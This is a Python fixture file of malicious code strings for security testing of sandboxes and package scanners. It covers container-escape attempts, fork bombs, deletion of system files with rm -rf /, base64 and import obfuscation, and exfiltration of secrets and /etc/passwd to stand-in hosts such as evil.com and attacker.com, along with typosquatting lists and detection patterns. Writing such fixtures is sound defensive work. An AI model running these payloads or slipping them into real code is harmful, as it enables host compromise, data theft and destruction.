"""
Malicious Package Fixtures for Security Testing

Contains intentionally malicious code samples for testing sandbox isolation,
vulnerability scanning, and governance enforcement.

**WARNING**: These fixtures are for TESTING ONLY and should NEVER be executed
outside isolated sandbox environments. All code samples are designed to be
detected and blocked by security layers.

Test Coverage:
- Container escape scenarios (privileged mode, socket mount, cgroup manipulation)
- Resource exhaustion (fork bomb, memory exhaustion, CPU exhaustion)
- Network exfiltration (outbound connections to external servers)
- Filesystem attacks (host filesystem writes, directory traversal)
- Code execution (arbitrary command execution, shell injection)
- Obfuscation techniques (base64, import obfuscation, dynamic eval)

Reference: Phase 35 Plan 05 - Security Testing
"""

# ============================================================================
# CONTAINER ESCAPE FIXTURES
# ============================================================================

MALICIOUS_CONTAINER_ESCAPE_PRIVILEGED = """
import subprocess

# Attempt container escape via privileged mode
# Privileged mode disables all security mechanisms (CVE-2019-5736)
subprocess.run(['mount', '-o', 'remount,rw', '/sys/fs/cgroup'])
"""

MALICIOUS_CONTAINER_ESCAPE_DOCKER_SOCKET = """
import docker

# Attempt to access Docker socket from container
# Mounting /var/run/docker.sock enables full host control
client = docker.from_env()
client.containers.run('alpine', 'cat /etc/shadow', volumes={'/host': {'bind': '/host', 'mode': 'rw'}})
"""

MALICIOUS_CONTAINER_ESCAPE_CGROUP = """
import os

# Attempt to escape via cgroup manipulation
# Writing to cgroup release_agent can execute commands on host
release_agent = b'/bin/bash'
cgroup_path = '/sys/fs/cgroup/memory'
with open(f'{cgroup_path}/release_agent', 'wb') as f:
    f.write(release_agent)

# Trigger the agent
with open(f'{cgroup_path}/notify_on_release', 'w') as f:
    f.write('1')
"""

MALICIOUS_CONTAINER_ESCAPE_DEVICE_MOUNT = """
import subprocess
import os

# Attempt to mount host devices
# Accessing /dev/sda1 enables full filesystem read/write
subprocess.run(['mount', '/dev/sda1', '/mnt/host'])
with open('/mnt/host/etc/passwd', 'w') as f:
    f.write('root:HACKED:0:0::/:/bin/bash\\n')
"""

# ============================================================================
# RESOURCE EXHAUSTION FIXTURES
# ============================================================================

MALICIOUS_RESOURCE_EXHAUSTION_FORK_BOMB = """
import os

# Fork bomb - attempts to exhaust system resources
# Each process spawns 2 children, exponential growth
while True:
    os.fork()
"""

MALICIOUS_RESOURCE_EXHAUSTION_FORK_BOMB_RECURSIVE = """
import os

# Recursive fork bomb (more aggressive)
def fork_bomb():
    while True:
        os.fork()
        os.fork()

fork_bomb()
"""

MALICIOUS_RESOURCE_EXHAUSTION_MEMORY = """
# Attempt to exhaust memory
# Allocates 1MB per iteration in infinite loop
data = []
while True:
    data.append(' ' * 1024 * 1024)  # 1MB per iteration
"""

MALICIOUS_RESOURCE_EXHAUSTION_MEMORY_FAST = """
# Fast memory exhaustion using list comprehension
# Creates massive list to consume memory immediately
try:
    data = [' ' * 1024 * 1024] * 100000  # 100GB allocation attempt
except MemoryError:
    print('Memory exhausted')
"""

MALICIOUS_RESOURCE_EXHAUSTION_CPU = """
# CPU exhaustion via infinite computation
# Attempts to use 100% CPU forever
import math

while True:
    math.factorial(10000)  # CPU-intensive operation
"""

MALICIOUS_RESOURCE_EXHAUSTION_DISK = """
# Disk space exhaustion
# Writes 1MB files until disk is full
import os

counter = 0
while True:
    filename = f'/tmp/fill_{counter}.dat'
    with open(filename, 'wb') as f:
        f.write(b' ' * 1024 * 1024)  # 1MB file
    counter += 1
"""

# ============================================================================
# NETWORK EXFILTRATION FIXTURES
# ============================================================================

MALICIOUS_NETWORK_EXFILTRATION_URLLIB = """
import urllib.request
import json

# Attempt to exfiltrate data via network
# Sends sensitive data to external server
data = {'sensitive': 'data', 'api_key': 'secret-key-12345'}
req = urllib.request.Request(
    'https://evil.com/steal',
    data=json.dumps(data).encode(),
    headers={'User-Agent': 'Mozilla/5.0'}
)
urllib.request.urlopen(req)
"""

MALICIOUS_NETWORK_EXFILTRATION_SOCKETS = """
import socket
import json

# Low-level socket exfiltration
# Bypasses higher-level network restrictions
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('evil.com', 443))
sock.sendall(json.dumps({'stolen': 'data'}).encode())
sock.close()
"""

MALICIOUS_NETWORK_EXFILTRATION_REQUESTS = """
import requests

# HTTP library exfiltration (common in real attacks)
# Uses popular requests library to blend in
data = {'exfiltrated': 'sensitive_data'}
requests.post('https://attacker.com/collect', json=data, timeout=5)
"""

MALICIOUS_NETWORK_DNS_TUNNELING = """
import socket

# DNS tunneling for data exfiltration
# Encodes data in DNS queries to bypass firewall
data = 'SECRET_DATA'

for char in data:
    query = f'{char}.evil.com'
    socket.gethostbyname(query)
"""

# ============================================================================
# FILESYSTEM ATTACK FIXTURES
# ============================================================================

MALICIOUS_FILESYSTEM_WRITE_HOST = """
# Attempt to write to host filesystem
# Tries to escape container via volume mount
with open('/host/etc/passwd', 'w') as f:
    f.write('root:HACKED:0:0::/:/bin/bash\\n')
"""

MALICIOUS_FILESYSTEM_DIRECTORY_TRAVERSAL = """
import os

# Directory traversal attack
# Attempts to access parent directories beyond container
path = '../../../etc/passwd'
with open(os.path.join('/tmp', path), 'w') as f:
    f.write('malicious content')
"""

MALICIOUS_FILESYSTEM_SYMLINK_ESCAPE = """
import os

# Symlink escape attack
# Creates symlinks to host filesystem
os.symlink('/proc/1/root/etc/passwd', '/tmp/host_passwd')
with open('/tmp/host_passwd', 'r') as f:
    print(f.read())  # Read host file
"""

MALICIOUS_FILESYSTEM_DELETE_SYSTEM = """
import os
import shutil

# Attempt to delete system files
# Dangerous deletion operations
paths = ['/etc/passwd', '/etc/shadow', '/bin/bash']
for path in paths:
    try:
        os.remove(path)
    except:
        shutil.rmtree(path)
"""

# ============================================================================
# CODE EXECUTION FIXTURES
# ============================================================================

MALICIOUS_CODE_EXECUTION_SUBPROCESS = """
import subprocess

# Arbitrary command execution via subprocess
# Executes shell command with user input
user_input = 'rm -rf /'
subprocess.run(user_input, shell=True)
"""

MALICIOUS_CODE_EXECUTION_OS_SYSTEM = """
import os

# Command execution via os.system
# Classic shell injection vulnerability
user_cmd = 'cat /etc/passwd; rm -rf /'
os.system(user_cmd)
"""

MALICIOUS_CODE_EXECUTION_EVAL = """
# Arbitrary code execution via eval
# Executes arbitrary Python code from user input
user_code = '__import__(\\"os\\").system(\\"rm -rf /\\")'
eval(user_code)
"""

MALICIOUS_CODE_EXECUTION_EXEC = """
# Arbitrary code execution via exec
# Similar to eval but executes statements
user_code = 'import os; os.system(\\"cat /etc/shadow\\")'
exec(user_code)
"""

MALICIOUS_CODE_EXECUTION_PICKLE = """
import pickle
import base64

# Unsafe pickle deserialization (RCE vulnerability)
# Pickle can execute arbitrary code during deserialization
malicious_pickle = base64.b64decode(
    b'gASVAAAAAAAAABdlLg=='  # Simplified example
)
pickle.loads(malicious_pickle)
"""

# ============================================================================
# OBFUSCATION FIXTURES
# ============================================================================

MALICIOUS_BASE64_OBFUSCATION = """
import base64

# Obfuscated malicious payload
# Decodes and executes base64-encoded command
payload = 'c3VicHJvY2Vzcy5ydW4oWyJybSIsICJyZiIsICIvIl0p'  # subprocess.run(['rm', 'rf', '/'])
decoded = base64.b64decode(payload).decode()
exec(decoded)
"""

MALICIOUS_IMPORT_OBFUSCATION = """
# Obfuscated import to bypass static scanning
# Uses getattr to dynamically import modules
getattr(__import__('subprocess'), 'run')(['sh', '-c', 'cat /etc/passwd'])
"""

MALICIOUS_IMPORT_OBFUSCATION_BUILTIN = """
import __builtin__

# Another obfuscation technique
# Modifies builtins to hide malicious imports
old_import = __builtin__.__import__

def malicious_import(name, *args):
    if name == 'os':
        return __import__('subprocess')  # Substitute os with subprocess
    return old_import(name, *args)

__builtin__.__import__ = malicious_import
"""

MALICIOUS_STRING_CONCATENATION_OBFUSCATION = """
# String concatenation obfuscation
# Builds malicious strings dynamically to avoid detection
s1 = 'subpro'
s2 = 'cess.'
s3 = 'run'
module = getattr(__import__(s1 + s2), s3)
module(['rm', '-rf', '/'])
"""

MALICIOUS_CHARACTER_CODE_OBFUSCATION = """
# Character code obfuscation
# Uses chr() to build strings character by character
module_name = ''.join(chr(c) for c in [115, 117, 98, 112, 114, 111, 99, 101, 115, 115])  # 'subprocess'
getattr(__import__(module_name), 'run')(['cat', '/etc/passwd'])
"""

# ============================================================================
# TYPOSQUATTING ATTACK DATA
# ============================================================================

TYPOSQUATTING_PACKAGES = [
    # Common typosquatting targets (attackers publish malicious packages)
    ("reqeusts", "requests"),      # Typo: 'requests'
    ("urllib", "urllib3"),          # Outdated name confusion
    ("numpyy", "numpy"),            # Typo: 'numpy'
    ("panads", "pandas"),           # Typo: 'pandas'
    ("matploitlib", "matplotlib"),  # Typo: 'matplotlib'
    ("flaskk", "flask"),            # Typo: 'flask'
    ("djnago", "django"),           # Typo: 'django'
    ("djangoo", "django"),          # Typo: 'django'
    ("reqeusts", "requests"),       # Typo: 'requests'
    ("pilllow", "pillow"),          # Typo: 'pillow'
]

# ============================================================================
# KNOWN VULNERABLE PACKAGES (CVE DATA)
# ============================================================================

KNOWN_VULNERABLE_PACKAGES = [
    {
        "name": "requests",
        "version": "2.20.0",
        "cve": "CVE-2018-18074",
        "severity": "HIGH",
        "description": "Requests library does not remove the Authorization header from HTTP requests",
        "fix_versions": ["2.20.1", "2.21.0", "2.22.0", "2.23.0", "2.24.0", "2.25.0", "2.25.1", "2.26.0", "2.27.0", "2.27.1", "2.28.0"]
    },
    {
        "name": "urllib3",
        "version": "1.24.2",
        "cve": "CVE-2019-11324",
        "severity": "HIGH",
        "description": "urllib3 before 1.24.3 does not remove the Authorization header from HTTP requests",
        "fix_versions": ["1.24.3", "1.25.0", "1.25.1", "1.25.2", "1.25.3", "1.25.4", "1.25.5", "1.25.6", "1.25.7", "1.25.8", "1.25.9", "1.25.10", "1.25.11", "1.26.0"]
    },
    {
        "name": "pillow",
        "version": "6.2.0",
        "cve": "CVE-2019-19911",
        "severity": "MEDIUM",
        "description": "Buffer overflow in PIL.ImagePath.Path when processing crafted image files",
        "fix_versions": ["6.2.1", "6.2.2", "7.0.0", "7.1.0", "7.1.1", "7.1.2", "7.2.0", "8.0.0", "8.0.1", "8.1.0", "8.1.1", "8.1.2", "8.2.0", "8.3.0", "8.4.0", "9.0.0", "9.0.1"]
    },
    {
        "name": "pyyaml",
        "version": "5.1",
        "cve": "CVE-2020-14343",
        "severity": "HIGH",
        "description": "python-yaml before 5.4.1 is vulnerable to arbitrary code execution",
        "fix_versions": ["5.3.1", "5.4.0", "5.4.1", "6.0", "6.0.1"]
    },
    {
        "name": "jinja2",
        "version": "2.11.2",
        "cve": "CVE-2021-32052",
        "severity": "MEDIUM",
        "description": "Jinja2 allows信息泄露 through template rendering",
        "fix_versions": ["2.11.3", "3.0.0", "3.0.1", "3.0.2", "3.0.3"]
    }
]

# ============================================================================
# DEPENDENCY CONFUSION ATTACK DATA
# ============================================================================

DEPENDENCY_CONFUSION_PACKAGES = [
    # Internal package names that attackers could publish to public PyPI
    # to trick organizations into installing malicious versions
    "internal-company-utils",
    "company-internal-sdk",
    "proprietary-algorithms",
    "acme-corp-tools",
    "enterprise-data-pipeline",
    "internal-analytics",
    "company-common",
    "acme-ml-framework",
    "internal-auth-lib",
    "proprietary-logger"
]

# ============================================================================
# STATIC ANALYSIS PATTERNS (DETECTED BY SECURITY SCANNER)
# ============================================================================

MALICIOUS_PATTERNS = [
    # Command execution
    "subprocess.call",
    "subprocess.run",
    "subprocess.Popen",
    "os.system",
    "os.popen",
    "os.spawn",
    "eval(",
    "exec(",
    "compile(",

    # Unsafe deserialization
    "pickle.loads",
    "pickle.load",
    "marshal.loads",
    "shelve.open",

    # Network access
    "urllib.request",
    "urllib.urlopen",
    "socket.socket",
    "socket.connect",
    "requests.post",
    "requests.get",
    "httplib.request",

    # File operations
    "open(",
    "file.write",
    "os.remove",
    "os.unlink",
    "shutil.rmtree",
    "pathlib.Path.unlink",
    "os.rename",

    # Obfuscation indicators
    "base64.b64decode",
    "getattr(__import__",
    "getattr(os,",
    "getattr(",
    "__import__",
    "__builtin__"
]

# ============================================================================
# LLM SEMANTIC ANALYSIS TEST CASES
# ============================================================================

LLM_SEMANTIC_TEST_CASES = {
    "benign": [
        """
def calculate_average(numbers):
    return sum(numbers) / len(numbers)
""",
        """
import json
data = {'name': 'test', 'value': 123}
print(json.dumps(data))
"""
    ],
    "suspicious": [
        """
import subprocess
user_input = input('Enter command: ')
subprocess.run(user_input, shell=True)
""",
        """
import base64
payload = 'c3VicHJvY2Vzcy5ydW4oWyJybSIsICJyZiIsICIvIl0p'
exec(base64.b64decode(payload).decode())
"""
    ],
    "malicious": [
        """
import os
while True:
    os.fork()  # Fork bomb
""",
        """
import socket
sock = socket.socket()
sock.connect(('attacker.com', 443))
sock.send(open('/etc/passwd').read())
"""
    ]
}
